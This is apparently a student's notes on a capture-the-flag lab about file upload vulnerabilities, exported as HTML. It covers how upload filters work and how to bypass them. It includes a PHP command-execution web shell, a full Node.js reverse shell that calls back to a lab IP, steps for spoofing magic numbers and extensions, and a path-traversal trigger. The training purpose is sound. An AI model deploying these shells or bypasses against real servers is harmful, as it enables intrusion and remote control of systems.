<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Upload Vulnerabilities</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Upload Vulnerabilities</h1><br/><strong><h1>Upload Vulnerabilities</h1></strong><br /><br /><strong><h3>1. Overwriting Existing Files:</h3></strong><br /><br />When files are uploaded to the server, a range of checks should be carried out to ensure that the file will not overwrite anything which already exists on the server. Common practice is to assign the file with a new name -- often either <strong>random</strong>, or with the <strong>date</strong> and <strong>time</strong> of upload <strong>added</strong> to the <strong>start</strong> or <strong>end</strong> of the <strong>original</strong> <strong>filename</strong>. Alternatively, checks may be applied to see if the filename already exists on the server; if a file with the same name already exists then the server will return an <strong>error message</strong> asking the user to pick a different file name. File <strong>permissions</strong> also come into play when protecting existing files from being overwritten. Web pages, for example, should not be writeable to the web user, thus preventing them from being overwritten with a malicious version uploaded by an attacker.<br /><br /><strong><h3>2. Remote Code Execution:</h3></strong><br /><br />Remote Code Execution (as the name suggests) would allow us to execute code arbitrarily on the web server. Whilst this is likely to be as a low-privileged web user account (such as www-data on Linux servers), it&#39;s still an extremely serious vulnerability. Remote code execution via an upload vulnerability in a web application tends to be exploited by uploading a program written in the same language as the back-end of the website (or another language which the server understands and will execute). Traditionally this would be PHP, however, in more recent times, other back-end languages have become more common (<strong>Python Django and Javascript in the form of Node.js</strong> being prime examples). It&#39;s worth noting that in a <strong>routed application</strong> (i.e. <strong>an application where the routes are defined programmatically rather than being mapped to the file-system</strong>), this method of attack becomes a lot more complicated and a lot less likely to occur. Most modern web frameworks are routed programmatically.<br /><br />PHP Code (php-simple.php):<br />&lt;?php<br />    echo system($_GET[&quot;cmd&quot;]);<br />?&gt;<br /><br />Eg. <a href="http://shell.uploadvulns.thm/resources/php-simple.php?cmd=cat%20/var/www/flag.txt">http://shell.uploadvulns.thm/resources/php-simple.php?cmd=cat%20/var/www/flag.txt</a><br /><br /><strong><h3>3. Filtering:</h3></strong><br /><br /><strong>Filtering Types (Based on Place of Implementation)####</strong><br /><br />A)	Client Side Filtering<br />B)	Server Side Filtering <br /><br /><br /><strong>Types of Filters (Based on How they work)</strong><br /><br /><strong>I) Extension Validation:</strong><br /><br />File extensions are used (in theory) to identify the contents of a file. In practice they are very easy to change, so actually don&#39;t mean much; however, MS Windows still uses them to identify file types, although Unix based systems tend to rely on other methods, which we&#39;ll cover in a bit. Filters that check for extensions work in one of two ways. They either <strong>blacklist extensions</strong> (i.e. have a list of extensions which are not allowed) or they <strong>whitelist extensions</strong> (i.e. have a list of extensions which are allowed, and reject everything else).<br /><br /><strong>II) File Type Filtering:</strong><br /><br />Similar to Extension validation, but more intensive, file type filtering looks, once again, to verify that the contents of a file are acceptable to upload. We&#39;ll be looking at two types of file type validation:<br /><br />		▪ <strong>MIME validation:</strong> MIME (Multipurpose Internet Mail Extension) types are used as an identifier for files -- originally when transfered as attachments over email, but now also when files are being transferred over HTTP(S). The MIME type for a file upload is attached in the header of the request, and looks something like this:<br />		<br />		<img src="images/312-1.png" alt="images/312-1.png" /><br />		<br />		MIME types follow the format &lt;type&gt;/&lt;subtype&gt;. In the request above, you can see that the image &quot;spaniel.jpg&quot; was uploaded to the server. As a legitimate JPEG image, the MIME type for this upload was &quot;image/jpeg&quot;. The MIME type for a file can be checked client-side and/or server-side; however, as MIME is based on the extension of the file, this is extremely easy to bypass.<br />		<br />		▪ <strong>Magic Number validation:</strong> Magic numbers are the more accurate way of determining the contents of a file; although, they are by no means impossible to fake. The <strong>&quot;magic number&quot; </strong>of a file is a <strong>string of bytes</strong> at the very <strong>beginning</strong> of the file content which identify the content. For example, a <strong>PNG</strong> <strong>file</strong> would have these bytes at the very top of the file: <strong>89 50 4E 47 0D 0A 1A 0A</strong>.<br />		<br />		<img src="images/312-2.png" alt="images/312-2.png" /><br />		<br />		Unlike Windows, Unix systems use magic numbers for identifying files; however, when dealing with file uploads, it is possible to check the magic number of the uploaded file to ensure that it is safe to accept. This is by no means a guaranteed solution, but it&#39;s more effective than checking the extension of a file.<br />		<br /><strong>III) File Length Filtering:</strong><br /><br />File length filters are used to prevent huge files from being uploaded to the server via an upload form (as this can potentially starve the server of resources). In most cases this will not cause us any issues when we upload shells; however, it&#39;s worth bearing in mind that if an upload form only expects a very small file to be uploaded, there may be a length filter in place to ensure that the file length requirement is adhered to. As an example, our fully fledged PHP reverse shell from the previous task is 5.4Kb big -- relatively tiny, but if the form expects a maximum of 2Kb then we would need to find an alternative shell to upload.<br /><br /><br /><strong>IV) File Name Filtering:</strong><br /><br />As touched upon previously, files uploaded to a server should be unique. Usually this would mean adding a random aspect to the file name, however, an alternative strategy would be to check if a file with the same name already exists on the server, and give the user an error if so. Additionally, file names should be sanitised on upload to ensure that they don&#39;t contain any &quot;<strong>bad characters</strong>&quot;, which could potentially cause problems on the file system when uploaded (e.g. <strong>null bytes</strong> or <strong>forward slashes on Linux</strong>, as well as control characters such as <strong>;</strong> and potentially unicode characters). What this means for us is that, on a well administered system, our uploaded files are unlikely to have the same name we gave them before uploading, so be aware that you may have to go hunting for your shell in the event that you manage to bypass the content filtering.<br /><br /><strong>V) File Content Filtering:</strong><br /><br />More complicated filtering systems may scan the full contents of an uploaded file to ensure that it&#39;s not spoofing its extension, MIME type and Magic Number. This is a significantly more complex process than the majority of basic filtration systems employ, and thus will not be covered in this room.<br /><br /><strong>Note:</strong> None of these filters are perfect by themselves -- they will usually be used in conjunction with each other, providing a multi-layered filter, thus increasing the security of the upload significantly. Any of these filters can all be applied client-side, server-side, or both.<br /><br />Similarly, different frameworks and languages come with their own inherent methods of filtering and validating uploaded files. As a result, it is possible for language specific exploits to appear; for example, until <strong>PHP major version five</strong>, it was possible to bypass an <strong>extension filter</strong> by appending a <strong>null</strong> <strong>byte</strong>, followed by a valid extension, to the malicious .php file. More recently it was also possible to inject PHP code into the <strong>exif</strong> <strong>data</strong> of an otherwise <strong>valid image file</strong>, then force the server to execute it. These are things that you are welcome to research further, should you be interested.<br /><br /><br /><strong>A)	Client Side Filtering Bypass</strong><br /><br />There are four easy ways to bypass your average client-side file upload filter:<br /><br />    1) Turn off Javascript in your browser -- this will work provided the site doesn&#39;t require Javascript in order to provide basic functionality. If turning off Javascript completely will prevent the site from working at all then one of the other methods would be more desirable; otherwise, this can be an effective way of completely bypassing the client-side filter.<br />    <br />    2) Intercept and modify the incoming page. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run. The process for this will be covered below.<br />    <br />    3) Intercept and modify the file upload. Where the previous method works before the webpage is loaded, this method allows the web page to load as normal, but intercepts the file upload after it&#39;s already passed (and been accepted by the filter). Again, we will cover the process for using this method in the course of the task.<br />    <br />    4) Send the file directly to the upload point. Why use the webpage with the filter, when you can send the file directly using a tool like <strong>curl</strong>? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. We will not be covering this method in any real depth in this tutorial, however, the syntax for such a command would look something like this:<br />   <br />  <strong>curl -X POST -F &quot;submit:&lt;value&gt;&quot; -F &quot;&lt;file-parameter&gt;:@&lt;path-to-file&gt;&quot; &lt;site&gt;</strong> <br />  <br />  To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.<br /><br /><br /><br /><span style="text-decoration:underline;">2) Intercept and modify the incoming page:</span><br /><br /><img src="images/312-3.png" alt="images/312-3.png" /><br /><br />The above is the HTML source of the upload webpage. As we can see the javascript in the box is allowing on <strong>image/jpeg</strong> files.<br />To remove this, intercept the web page request in <strong>Burpsuite</strong>.<br /><br /><img src="images/312-4.png" alt="images/312-4.png" /><br /><br />Next, <strong>Right-Click</strong> and select <strong>Do intercept</strong> ---→ <strong>Response to this request</strong>  [It is done to catch the server response]<br />Then, hit forward and view the code for the page of server&#39;s response in Burpsuite as below.<br /><br /><img src="images/312-5.png" alt="images/312-5.png" /><br /><br />Then delete the highlighted part and click on Forward.<br />Now, we can upload any type of file.<br /><br /><br /><strong>Note:</strong> Here the Javascript was hardcoded in the main page. That is why, we could view it in Server Response.<br /><br /><strong>It&#39;s worth noting here</strong> that Burpsuite will <strong>not</strong>, by default, intercept any <strong>external</strong> <strong>Javascript</strong> files that the web page is loading. If you need to edit a script which is not inside the main page being loaded, you&#39;ll need to go to the <strong>&quot;Options&quot;</strong> tab at the top of the Burpsuite window, then under the <strong>&quot;Intercept Client Requests&quot;</strong> section, edit the condition of the first line to remove <strong>^js$|</strong>.... as shown below.<br /><br /><img src="images/312-6.png" alt="images/312-6.png" /><br /><br /><br /><strong>Important:</strong> Next, we reload the page. (Note: Use Ctrl + F5 to clear cache to prevent skipping of cached js files)<br />Once Reload, now we will see all the <strong>javascript GET</strong> requests. The <strong>one</strong> which we need to <strong>edit</strong>. <br /><br /><strong>Right Click ---→ Do Intercept -----→ Response to this request</strong><br /><br />Therefore, when the server send the javascript file, Burpsuite will  intercept it before sending to the browser.<br /><br /><span style="text-decoration:underline;">3) Intercept and modify the file upload</span><br /><strong>Note:</strong> In this method, unlike above we do not remove the client side js code. We rename our <strong>.php</strong> file to <strong>.jpg</strong> &amp; thus it won&#39;t show any error during initial javascript check.<br />However, before sending to the server we need to correct the extensions as follows:<br /><br />Once again we&#39;ll activate our Burpsuite intercept, then click &quot;Upload&quot; and catch the request:<br /><br /><img src="images/312-7.png" alt="images/312-7.png" /><br /><br /><br />Observe that the MIME type of our PHP shell is currently <strong>image/jpeg</strong>. We&#39;ll change this to <strong>text/x-php</strong>, and the file extension from<strong> .jpg</strong> to <strong>.php</strong>, then forward the request to the server:<br /><br /><img src="images/312-8.png" alt="images/312-8.png" /><br /><br /><br /><br /><strong>B)	Server Side Filtering Bypass</strong><br /><br />1. File Extensions<br />2. Magic Numbers<br /><br /><span style="text-decoration:underline;">1. File Extensions</span><br />Client-side filters are easy to bypass -- you can see the code for them, even if it&#39;s been obfuscated and needs processed before you can read it; but what happens when you can&#39;t see or manipulate the code? Well, that&#39;s a server-side filter. In short, we have to perform a lot of testing to build up an idea of what is or is not allowed through the filter, then gradually put together a payload which conforms to the restrictions.<br /><br />For the first part of this task we&#39;ll take a look at a website that&#39;s using a blacklist for file extensions as a server side filter. There are a variety of different ways that this could be coded, and the bypass we use is dependent on that. In the real world we wouldn&#39;t be able to see the code for this, but for this example, it will be included here:<br /><br />Example Code:<br /><strong>&lt;?php<br />    //Get the extension<br />    $extension = pathinfo($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;])[&quot;extension&quot;];<br />    //Check the extension against the blacklist -- .php and .phtml<br />    switch($extension){<br />        case &quot;php&quot;:<br />        case &quot;phtml&quot;:<br />        case NULL:<br />            $uploadFail = True;<br />            break;<br />        default:<br />            $uploadFail = False;<br />    }<br />?&gt;</strong><br /><br /><br />In this instance, the code is looking for the last period (.) in the file name and uses that to confirm the extension, so that is what we&#39;ll be trying to bypass here. Other ways the code could be working include: searching for the first period in the file name, or splitting the file name at each period and checking to see if any blacklisted extensions show up. We&#39;ll cover this latter case later on, but in the meantime, let&#39;s focus on the code we&#39;ve got here.<br /><br />We can see that the code is filtering out the .php and .phtml extensions, so if we want to upload a PHP script we&#39;re going to have to find another extension. The wikipedia page for PHP gives us a few common extensions that we can try; however, there are actually a variety of other more rarely used extensions available that webservers may nonetheless still recognise. These include: <strong>.php3, .php4, .php5, .php7, .phps, .php-s, .pht and .phar</strong>. Many of these bypass the filter (which only blocks <strong>.php</strong> and<strong> .phtml</strong>), but it appears that the server is configured <strong>not to recognise</strong> them as PHP files, as in the below example: <br /><br /><img src="images/312-9.png" alt="images/312-9.png" /><br /><br />This is actually the default for Apache2 servers, at the time of writing; however, the sysadmin may have changed the default configuration (or the server may be out of date), so it&#39;s well worth trying.<br /><br />Eventually we find that the <strong>.phar </strong>extension bypasses the filter -- and works -- thus giving us our shell:<br /><br /><img src="images/312-10.png" alt="images/312-10.png" /><br /><br /><strong>Solution To Task</strong>: <strong>rshell.jpg.php5</strong><br /><br /><span style="text-decoration:underline;">2. Magic Numbers</span><br /><br />We&#39;ve already had a look at server-side extension filtering, but let&#39;s also take the opportunity to see how magic number checking could be implemented as a server-side filter.<br /><br />As mentioned previously, magic numbers are used as a more accurate identifier of files. The magic number of a file is a string of hex digits, and is always the very first thing in a file. Knowing this, it&#39;s possible to use magic numbers to validate file uploads, simply by reading those first few bytes and comparing them against either a whitelist or a blacklist. Bear in mind that this technique can be very effective against a PHP based webserver; however, it can sometimes fail against other types of webserver (hint hint).<br /><br />As expected, if we upload our standard shell.php file, we get an error; however, if we upload a JPEG, the website is fine with it. All running as per expected so far.<br /><br />From the previous attempt at an upload, we know that JPEG files are accepted, so let&#39;s try adding the JPEG magic number to the top of our shell.php file. A quick look at the list of file signatures on Wikipedia shows us that there are several possible magic numbers of JPEG files. It shouldn&#39;t matter which we use here, so let&#39;s just pick one <strong>(FF D8 FF DB)</strong>. We could add the ASCII representation of these digits<strong> (ÿØÿÛ) </strong>directly to the <strong>top of the file</strong> but it&#39;s often easier to work directly with the hexadecimal representation, so let&#39;s cover that method.<br /><br />Before we get started, let&#39;s use the Linux file command to check the file type of our shell:<br /><br /><img src="images/312-11.png" alt="images/312-11.png" /><br /><br />As expected, the command tells us that the filetype is PHP. Keep this in mind as we proceed with the explanation.<br /><br />We can see that the magic number we&#39;ve chosen is four bytes long, so let&#39;s open up the reverse shell script and add four random characters on the first line. These characters do not matter, so for this example we&#39;ll just use four &quot;A&quot;s:<br /><br /><img src="images/312-12.png" alt="images/312-12.png" /><br /><br />Save the file and exit. Next we&#39;re going to reopen the file in hexeditor (which comes by default on Kali), or any other tool which allows you to see and edit the shell as hex. In <strong>hexeditor</strong> the file looks like this:<br /><br /><img src="images/312-13.png" alt="images/312-13.png" /><br /><br />Note the four bytes in the red box: they are all <strong>41</strong>, which is the hex code for a capital &quot;A&quot; -- exactly what we added at the top of the file previously.<br /><br />Change this to the <strong>magic number</strong> we found earlier for <strong>JPEG</strong> files: <strong>FF D8 FF DB</strong><br /><br /><img src="images/312-14.png" alt="images/312-14.png" /><br /><br />Now if we save and exit the file (Ctrl + x), we can use <strong>file</strong> once again, and see that we have successfully spoofed the filetype of our shell:<br /><br /><img src="images/312-15.png" alt="images/312-15.png" /><br /><br />Perfect. Now let&#39;s try uploading the modified shell and see if it bypasses the filter!<br />And We were able to successfully upload it and get reverse shell.<br /><br /><br /><br /><strong>Solution To Task:</strong> Add <strong>GIF89a213213123</strong> to the begining of php reverse shell file.<br />We can check by using <strong>file</strong> command. (it will show that the file is a gif)<br />Next, we upload it &amp; get the shell.<br /><br /><br /><strong><h2>Example Methology (Black Box)</h2></strong><br /><br />We&#39;ve seen various different types of filter now -- both client side and server side -- as well as the general methodology for file upload attacks. In the next task you&#39;re going to be given a black-box file upload challenge to complete, so let&#39;s take the opportunity to discuss an example methodology for approaching this kind of challenge in a little more depth. You may develop your own alternative to this method, however, if you&#39;re new to this kind of attack, you may find the following information useful.<br /><br />We&#39;ll look at this as a step-by-step process. Let&#39;s say that we&#39;ve been given a website to perform a security audit on.<br /><br />    1. The first thing we would do is take a look at the website as a whole. Using browser extensions such as the aforementioned Wappalyzer (or by hand) we would look for indicators of what languages and frameworks the web application might have been built with. Be aware that Wappalyzer is not always 100% accurate. A good start to enumerating this manually would be by making a request to the website and intercepting the response with Burpsuite. Headers such as <strong>server</strong> or <strong>x-powered-by</strong> can be used to gain information about the server. We would also be looking for vectors of attack, like, for example, an upload page.<br />    <br />    2. Having found an upload page, we would then aim to inspect it further. Looking at the source code for client-side scripts to determine if there are any client-side filters to bypass would be a good thing to start with, as this is completely in our control.<br />    <br />    3. We would then attempt a completely innocent file upload. From here we would look to see how our file is accessed. In other words, can we access it directly in an uploads folder? Is it embedded in a page somewhere? What&#39;s the naming scheme of the website? This is where tools such as Gobuster might come in if the location is not immediately obvious. This step is extremely important as it not only improves our knowledge of the virtual landscape we&#39;re attacking, it also gives us a baseline &quot;accepted&quot; file which we can base further testing on.<br />        <br />        ▸ An important Gobuster switch here is the <strong>-x</strong> switch, which can be used to look for files with specific extensions. For example, if you added <strong>-x php,txt,html</strong> to your Gobuster command, the tool would append <strong>.php, .txt, and .html </strong>to each word in the selected wordlist, one at a time. This can be very useful if you&#39;ve managed to upload a payload and the server is changing the name of uploaded files.<br />    <br />    4. Having ascertained how and where our uploaded files can be accessed, we would then attempt a malicious file upload, bypassing any client-side filters we found in step two. We would expect our upload to be stopped by a server side filter, but the error message that it gives us can be extremely useful in determining our next steps.<br /><br /><br />Assuming that our malicious file upload has been stopped by the server, here are some ways to ascertain what kind of server-side filter may be in place:<br /><br />    ▪ If you can successfully upload a file with a totally invalid file extension (e.g. <strong>testingimage.invalidfileextension</strong>) then the chances are that the server is using an extension blacklist to filter out executable files. If this upload fails then any extension filter will be operating on a whitelist.<br />    <br />    ▪ Try re-uploading your originally accepted innocent file, but this time change the magic number of the file to be something that you would expect to be filtered. If the upload fails then you know that the server is using a magic number based filter.<br />    <br />    ▪ As with the previous point, try to upload your innocent file, but intercept the request with Burpsuite and change the MIME type of the upload to something that you would expect to be filtered. If the upload fails then you know that the server is filtering based on MIME types.<br />    <br />    ▪ Enumerating file length filters is a case of uploading a small file, then uploading progressively bigger files until you hit the filter. At that point you&#39;ll know what the acceptable limit is. If you&#39;re very lucky then the error message of original upload may outright tell you what the size limit is. Be aware that a small file length limit may prevent you from uploading the reverse shell we&#39;ve been using so far.<br />    <br />    <br /><strong><h3>Challenge Task</h3></strong><br /><br />Using Wappalyzer we found Node.js being used in the Express Framework. (PHP shell won&#39;t work)<br />We need Node.js reverse shell.<br /><br /><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs</a><br /><br /><strong>(function(){<br />    var net = require(&quot;net&quot;),<br />        cp = require(&quot;child_process&quot;),<br />        sh = cp.spawn(&quot;/bin/sh&quot;, []);<br />    var client = new net.Socket();<br />    client.connect(443, &quot;10.11.72.31&quot;, function(){<br />        client.pipe(sh.stdin);<br />        sh.stdout.pipe(client);<br />        sh.stderr.pipe(client);<br />    });<br />    return /a/; // Prevents the Node.js application from crashing<br />})();</strong><br /><br />We place it in a file named <strong>shell.js</strong><br /><br /><br />The website client side filter in <strong>upload.js</strong><br />Intercept the GET request for this file &amp; then intercept the server response for this file using the following.<br /><br /><strong>Right Click ---→ Do Intercept -----→ Response to this request</strong><br /><br />Then remove the client filters from the javascript file and forward it to the browser.<br />Now, we have stripped the Client Side Filters.<br /><br />However, Server Side Filter exists for Extension. We need to rename our nodejs shell from <strong>.js</strong> to <strong>.jpg</strong><br /><br /><br />Now, to find where the files are uploaded we need to look in <strong>/content </strong>directory, But it is not browsable.<br />Thus, we will use Gobuster with the provided wordlist as follows.<br /><br /><strong>gobuster dir -u http://jewel.uploadvulns.thm/content -x jpg -t 250 -w UploadVulnsWordlist.txt</strong><br /><br /><img src="images/312-16.png" alt="images/312-16.png" /><br /><br />We will use the same gobuster code again after sucessful upload to know the name of our upload file.<br /><br /><img src="images/312-17.png" alt="images/312-17.png" /><br /><br />We now know the name of our uploaded file is <strong>SWF.jpg</strong><br />If we try to open it in URL <strong>http://jewel.uploadvulns.thm/content/SWF.jpg</strong> we will get an error as SHELL code in Node JS doesn&#39;t execute directly.<br /><br /><br />Upon initial Dirsearch We had found the directories <strong>admin, modules, content</strong><br />Lets go to Admin<br /><br /><img src="images/312-18.png" alt="images/312-18.png" /><br /><br />It tells to execute file from modules.<br />We can use the following to load our file.<br />(Since modules and content are generally in same directory)<br /><br /><strong>../content/SWF.jpg</strong><br /><br />Also, keep listner running.<br />Thus, we have a reverse shell.<br /><br /></div>
</body>
</html>
